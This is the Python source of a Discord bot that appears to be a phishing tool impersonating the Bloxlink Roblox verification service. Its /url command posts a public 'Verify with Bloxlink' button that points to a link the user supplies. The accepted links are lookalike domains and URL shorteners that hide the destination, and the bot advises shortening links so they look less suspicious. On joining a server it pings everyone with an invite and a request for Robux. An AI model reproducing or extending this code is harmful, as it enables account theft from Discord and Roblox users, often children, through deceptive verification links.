import os
import discord
from discord import app_commands
from discord import Embed

# Set up intents - ONLY guilds and defaults
intents = discord.Intents.default()
intents.guilds = True

# Create client with CommandTree
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

# On bot ready
@client.event
async def on_ready():
    print(f'{client.user} has connected to Discord!')
    print(f'Bot is in {len(client.guilds)} guild(s)')
    
    # Set bot activity
    await client.change_presence(activity=discord.Activity(
        type=discord.ActivityType.playing,
        name="/invite | blox.link"
    ))
    
    # Sync commands globally
    try:
        synced = await tree.sync()
        print(f"Synced {len(synced)} command(s) globally")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

# Send welcome message when joining new guild
@client.event
async def on_guild_join(guild):
    # Find appropriate channel
    channel = guild.system_channel
    
    # If no system channel, find first available text channel
    if channel is None:
        for text_channel in guild.text_channels:
            if text_channel.permissions_for(guild.me).send_messages:
                channel = text_channel
                break
    
    # Send welcome message if we found a channel
    if channel and channel.permissions_for(guild.me).send_messages:
        try:
            # Send @everyone and embed in same message
            content_message = "||@everyone||"
            
            # Create embed with proper formatting (removed ## from title)
            embed = Embed(
                title="🚀 Bot Joined!",
                description=(
                    "Hello! Thanks for using this service.\n\n"
                    "If you want to donate via Robux make sure to dm @Mar\n\n"
                    "**NOTE:** This bot is made for **Flapes server**. If this bot is from a different server, "
                    "**REPORT THIS TO ME OR THE OWNER OF YOUR SERVER.**\n\n"
                    "**🛑 DELETE THIS MESSAGE TO CONTINUE USING THE BOT 🛑**"
                ),
                color=0xFFA500  # Orange color
            )
            
            # Send the message with @everyone and embed
            await channel.send(content=content_message, embed=embed)
            
            # Send the invite link in a separate message (for preview)
            await channel.send("https://discord.gg/qnDrD3rU2M")
            
            print(f"Sent welcome message to {guild.name}")
        except discord.Forbidden:
            print(f"Missing permissions to send message in {guild.name}")

# Define the single /url command
@tree.command(
    name="url",
    description="Get a verification link with Bloxlink"
)
@app_commands.describe(
    link="Enter a valid Bloxlink URL (https://blox-link.com or https://bloxlinkbot.com)"
)
async def url_command(interaction: discord.Interaction, link: str):
    # Define all valid base domains
    valid_base_domains = [
        "https://blox-link.com",
        "https://bloxlinkbot.com",
        "https://is.gd",
        "https://v.gd", 
        "https://da.gd",
        "https://clck.ru"
    ]
    
    # Check if link is a raw bloxlink domain (no path or just domain)
    raw_bloxlink_domains = [
        "https://blox-link.com",
        "https://bloxlinkbot.com",
        "https://blox-link.com/",
        "https://bloxlinkbot.com/"
    ]
    
    # Validate the link starts with a valid domain
    is_valid = any(link.startswith(domain) for domain in valid_base_domains)
    
    if not is_valid:
        # Send ephemeral error message (only visible to user)
        error_message = (
            "hey dude wrong domain lol\n\n"
            "Supported:\n"
            "https://blox-link.com\n"
            "https://bloxlinkbot.com\n"
            "https://flapes.vercel.app/hyperlink"
        )
        await interaction.response.send_message(error_message, ephemeral=True)
        return
    
    # Check if link is a raw bloxlink domain (needs shortening)
    needs_shortening = False
    for domain in ["https://blox-link.com", "https://bloxlinkbot.com"]:
        if link == domain or link == domain + "/":
            needs_shortening = True
            break
    
    # Create success message EXACTLY as specified
    server_name = f"**{interaction.guild.name}**"
    success_message = (
        f"Welcome to {server_name}! Click the button below to Verify with Bloxlink and gain access to the rest of the server."
    )
    
    # Create view with buttons
    view = discord.ui.View()
    
    # Button 1: Verify with Bloxlink (Green style, no emoji)
    view.add_item(
        discord.ui.Button(
            label="Verify with Bloxlink",
            style=discord.ButtonStyle.success,  # This is green
            url=link
        )
    )
    
    # Button 2: Need help (Grey without any emoji)
    view.add_item(
        discord.ui.Button(
            label="Need help?",
            style=discord.ButtonStyle.secondary,  # This is grey
            url="https://www.youtube.com/playlist?list=PLz7SOP-guESE1V6ywCCLc1IQWiLURSvBE"
        )
    )
    
    # Send a regular public message (non-ephemeral) as the response
    await interaction.response.send_message(success_message, view=view, ephemeral=False)
    
    # If the link needs shortening, send ephemeral warning to the user
    if needs_shortening:
        warning_message = (
            "⚠️ You probably need to shorten the link first ⚠️\n"
            "shorten it here **https://flapes.vercel.app/hyperlink**"
        )
        # Send ephemeral warning to the user only
        await interaction.followup.send(warning_message, ephemeral=True)

# Run the bot
if __name__ == "__main__":
    # Load token from environment variable
    token = os.getenv("DISCORD_TOKEN")
    
    # Fallback to .env file if environment variable not set
    if not token:
        try:
            from dotenv import load_dotenv
            load_dotenv()
            token = os.getenv("DISCORD_TOKEN")
        except ImportError:
            pass
    
    # Final check for token
    if not token:
        print("Error: No Discord token found.")
        print("Please set the DISCORD_TOKEN environment variable or create a .env file.")
        print("Example .env file contents:")
        print("DISCORD_TOKEN=your_bot_token_here")
        exit(1)
    
    client.run(token)
